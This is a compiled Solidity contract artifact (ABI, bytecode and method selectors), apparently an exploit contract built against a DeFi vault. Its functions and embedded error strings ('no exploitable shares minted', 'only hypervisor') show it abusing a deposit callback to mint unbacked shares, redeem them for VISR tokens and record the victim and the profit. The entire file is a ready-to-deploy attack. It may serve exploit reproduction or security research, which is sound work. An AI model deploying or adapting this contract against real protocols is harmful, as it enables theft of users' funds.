{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"LEGACY_ATTACKER","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"LEGACY_SCAN_CANDIDATE_ONE","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"LEGACY_SCAN_CANDIDATE_TWO","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"delegatedTransferERC20","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"depositAmountUsed","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"directPathSucceeded","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"executed","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"fallbackContractPathUsed","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"recursiveMintEntered","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"sharesAfter","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"sharesBefore","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"victimUsed","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"visrAfter","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"visrBefore","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"}],"bytecode":{"object":"0x608080604052346015576111f5908161001a8239f35b5f80fdfe6080806040526004361015610012575f80fd5b5f3560e01c9081630c3c74551461088557508063215f9811146108605780632e88fb971461083057806331a38c891461080e5780633c2448ed1461034057806349343624146102b2578063538661d51461028457806355c5383a146102675780635ff972cc1461024b578063739250f41461021d5780638c623b72146102005780638da5cb5b146101e65780638deb8aac146101c15780639aa3834b1461019f578063bcb7e2ce1461017a578063cc1f2afa14610153578063d331775314610136578063e536bf971461010e5763ff856e0a146100ed575f80fd5b3461010a575f36600319011261010a576020600454604051908152f35b5f80fd5b3461010a575f36600319011261010a57600154604051602091821c6001600160a01b03168152f35b3461010a575f36600319011261010a576020600554604051908152f35b3461010a575f36600319011261010a5760206040515f5160206111a05f395f51905f528152f35b3461010a575f36600319011261010a57602060ff60015460181c166040519015158152f35b3461010a575f36600319011261010a576040516001600160a01b038152602090f35b3461010a575f36600319011261010a57602060ff60015460101c166040519015158152f35b3461010a575f36600319011261010a576020604051308152f35b3461010a575f36600319011261010a576020600254604051908152f35b3461010a575f36600319011261010a57602060405173582212202d52f0de276f4f2ab12d382d4e75a5b38152f35b3461010a575f36600319011261010a5760205f54604051908152f35b3461010a575f36600319011261010a576020600654604051908152f35b3461010a575f36600319011261010a576020604051738efab89b497b887cdaa2fb08ff71e4b3827774b28152f35b3461010a575f36600319011261010a5760405163468ee2b560e11b81526020816004815f5160206111a05f395f51905f525afa8015610335576020915f91610308575b506040516001600160a01b039091168152f35b6103289150823d841161032e575b61032081836108cb565b8101906109f8565b826102f5565b503d610316565b6040513d5f823e3d90fd5b3461010a575f36600319011261010a5760015460ff81166107d65760ff19166001908117905560405163468ee2b560e11b81526020816004815f5160206111a05f395f51905f525afa908115610335575f916107b7575b506040516305888dfd60e01b81526020816004815f5160206111a05f395f51905f525afa908115610335575f91610798575b506040516370a0823160e01b81523060048201526001600160a01b0383169290602081602481875afa908115610335575f91610766575b506005556040516370a0823160e01b81523060048201526001600160a01b0383169290602081602481875afa908115610335575f91610734575b506003556104488183610a38565b60045460035414610725575b60045460035414610715575b5050600454600354146105f1575b50600454600354808211156105ac5761048691610a17565b60405190632d182be560e21b825260048201523060248201523060448201526020816064815f5f5160206111a05f395f51905f525af180156103355761057b575b506020602491604051928380926370a0823160e01b82523060048301525afa908115610335575f91610549575b5080600655600554808211156105115761050d91610a17565b5f55005b60405162461bcd60e51b815260206004820152601060248201526f1b9bc8159254d4881c995919595b595960821b6044820152606490fd5b90506020813d602011610573575b81610564602093836108cb565b8101031261010a5751816104f4565b3d9150610557565b6020813d6020116105a4575b81610594602093836108cb565b8101031261010a575060206104c7565b3d9150610587565b60405162461bcd60e51b815260206004820152601c60248201527f6e6f206578706c6f697461626c6520736861726573206d696e746564000000006044820152606490fd5b62010000600154306bffffffffffffffffffffffff60a01b60075416176007556a52b7d2dcc80cd2e400000060085563ffff0000191617600155604051630b8b4a6160e21b81526a52b7d2dcc80cd2e40000006004820152306024820152306044820152602081606481800301815f5f5160206111a05f395f51905f525af18015610335576106e4575b506020602491604051928380926370a0823160e01b82523060048301525afa908115610335575f916106b2575b506004558161046e565b90506020813d6020116106dc575b816106cd602093836108cb565b8101031261010a5751826106a8565b3d91506106c0565b6020813d60201161070d575b816106fd602093836108cb565b8101031261010a5750602061067b565b3d91506106f0565b61071e91610f0c565b8280610460565b61072f8183610ccb565b610454565b90506020813d60201161075e575b8161074f602093836108cb565b8101031261010a57518561043a565b3d9150610742565b90506020813d602011610790575b81610781602093836108cb565b8101031261010a575184610400565b3d9150610774565b6107b1915060203d60201161032e5761032081836108cb565b826103c9565b6107d0915060203d60201161032e5761032081836108cb565b81610397565b60405162461bcd60e51b815260206004820152601060248201526f185b1c9958591e48195e1958dd5d195960821b6044820152606490fd5b3461010a575f36600319011261010a57602060ff600154166040519015158152f35b3461010a57606036600319011261010a5761084961089f565b506108526108b5565b5061085e604435610910565b005b3461010a575f36600319011261010a57602060ff60015460081c166040519015158152f35b3461010a575f36600319011261010a576020906003548152f35b600435906001600160a01b038216820361010a57565b602435906001600160a01b038216820361010a57565b90601f8019910116810190811067ffffffffffffffff8211176108ed57604052565b634e487b7160e01b5f52604160045260245ffd5b9081602091031261010a575190565b5f5160206111a05f395f51905f5233036109c15760015460ff8160181c166109bd5763ff0000001916630100000017600155600754604051630b8b4a6160e21b815260048101929092523060248301526001600160a01b031660448201526020816064815f5f5160206111a05f395f51905f525af18015610335576109925750565b6109b39060203d6020116109b6575b6109ab81836108cb565b810190610901565b50565b503d6109a1565b5050565b60405162461bcd60e51b815260206004820152600f60248201526e37b7363c90343cb832b93b34b9b7b960891b6044820152606490fd5b9081602091031261010a57516001600160a01b038116810361010a5790565b91908203918211610a2457565b634e487b7160e01b5f52601160045260245ffd5b30738efab89b497b887cdaa2fb08ff71e4b3827774b2148015610cad575b6109bd576040516370a0823160e01b8152738efab89b497b887cdaa2fb08ff71e4b3827774b26004820152906001600160a01b0316602082602481845afa918215610335575f92610c78575b50602060449160405192838092636eb1769f60e11b8252738efab89b497b887cdaa2fb08ff71e4b3827774b260048301525f5160206111a05f395f51905f5260248301525afa908115610335575f91610c46575b5080821015610c3f57505b80156109bd57604051630b8b4a6160e21b815260048101829052738efab89b497b887cdaa2fb08ff71e4b3827774b260248201523060448201526020816064815f5f5160206111a05f395f51905f525af19081610c10575b50610b62575050565b6040516370a0823160e01b815230600482015291602090839060249082906001600160a01b03165afa918215610335575f92610bdc575b506003548211610ba7575050565b6001805463ffff0100600160c01b031916778efab89b497b887cdaa2fb08ff71e4b3827774b200000100179055600255600455565b9091506020813d602011610c08575b81610bf8602093836108cb565b8101031261010a5751905f610b99565b3d9150610beb565b6020813d602011610c37575b81610c29602093836108cb565b8101031261010a5751610b59565b3d9150610c1c565b9050610b01565b90506020813d602011610c70575b81610c61602093836108cb565b8101031261010a57515f610af6565b3d9150610c54565b9091506020813d602011610ca5575b81610c94602093836108cb565b8101031261010a5751906020610aa2565b3d9150610c87565b50738efab89b497b887cdaa2fb08ff71e4b3827774b23b1515610a56565b6001600160a01b0330148015610efb575b6109bd576040516370a0823160e01b81526001600160a01b0360048201819052909116602082602481845afa918215610335575f92610ec6575b50604051636eb1769f60e11b81526001600160a01b0360048201525f5160206111a05f395f51905f52602482015290602090829060449082905afa908115610335575f91610e94575b5080821015610e8d57505b80156109bd57604051630b8b4a6160e21b8152600481018290526001600160a01b0360248201523060448201526020816064815f5f5160206111a05f395f51905f525af19081610e5e575b50610dbe575050565b6040516370a0823160e01b815230600482015291602090839060249082906001600160a01b03165afa918215610335575f92610e2a575b506003548211610e03575050565b6001805463ffff0100600160c01b03191663ffffff00600160c01b03179055600255600455565b9091506020813d602011610e56575b81610e46602093836108cb565b8101031261010a5751905f610df5565b3d9150610e39565b6020813d602011610e85575b81610e77602093836108cb565b8101031261010a5751610db5565b3d9150610e6a565b9050610d6a565b90506020813d602011610ebe575b81610eaf602093836108cb565b8101031261010a57515f610d5f565b3d9150610ea2565b9091506020813d602011610ef3575b81610ee2602093836108cb565b8101031261010a5751906020610d16565b3d9150610ed5565b506001600160a01b033b1515610cdc565b3073582212202d52f0de276f4f2ab12d382d4e75a5b3148015611181575b6109bd576040516370a0823160e01b815273582212202d52f0de276f4f2ab12d382d4e75a5b36004820152906001600160a01b0316602082602481845afa918215610335575f9261114c575b50602060449160405192838092636eb1769f60e11b825273582212202d52f0de276f4f2ab12d382d4e75a5b360048301525f5160206111a05f395f51905f5260248301525afa908115610335575f9161111a575b508082101561111357505b80156109bd57604051630b8b4a6160e21b81526004810182905273582212202d52f0de276f4f2ab12d382d4e75a5b360248201523060448201526020816064815f5f5160206111a05f395f51905f525af190816110e4575b50611036575050565b6040516370a0823160e01b815230600482015291602090839060249082906001600160a01b03165afa918215610335575f926110b0575b50600354821161107b575050565b6001805463ffff0100600160c01b03191677582212202d52f0de276f4f2ab12d382d4e75a5b300000100179055600255600455565b9091506020813d6020116110dc575b816110cc602093836108cb565b8101031261010a5751905f61106d565b3d91506110bf565b6020813d60201161110b575b816110fd602093836108cb565b8101031261010a575161102d565b3d91506110f0565b9050610fd5565b90506020813d602011611144575b81611135602093836108cb565b8101031261010a57515f610fca565b3d9150611128565b9091506020813d602011611179575b81611168602093836108cb565b8101031261010a5751906020610f76565b3d915061115b565b5073582212202d52f0de276f4f2ab12d382d4e75a5b33b1515610f2a56fe000000000000000000000000c9f27a50f82571c1c8423a42970613b8dbda14efa2646970667358221220ea4e6f1f1b8c0da966244b8fe09ac11c93174a24b8eca370ea68ea61169ef1c464736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"LEGACY_ATTACKER()":"538661d5","LEGACY_SCAN_CANDIDATE_ONE()":"9aa3834b","LEGACY_SCAN_CANDIDATE_TWO()":"739250f4","TARGET()":"cc1f2afa","delegatedTransferERC20(address,address,uint256)":"2e88fb97","depositAmountUsed()":"8c623b72","directPathSucceeded()":"215f9811","executeOnOpportunity()":"3c2448ed","executed()":"31a38c89","fallbackContractPathUsed()":"8deb8aac","owner()":"8da5cb5b","profitAmount()":"5ff972cc","profitToken()":"49343624","recursiveMintEntered()":"bcb7e2ce","sharesAfter()":"ff856e0a","sharesBefore()":"0c3c7455","victimUsed()":"e536bf97","visrAfter()":"55c5383a","visrBefore()":"d3317753"},"id":0}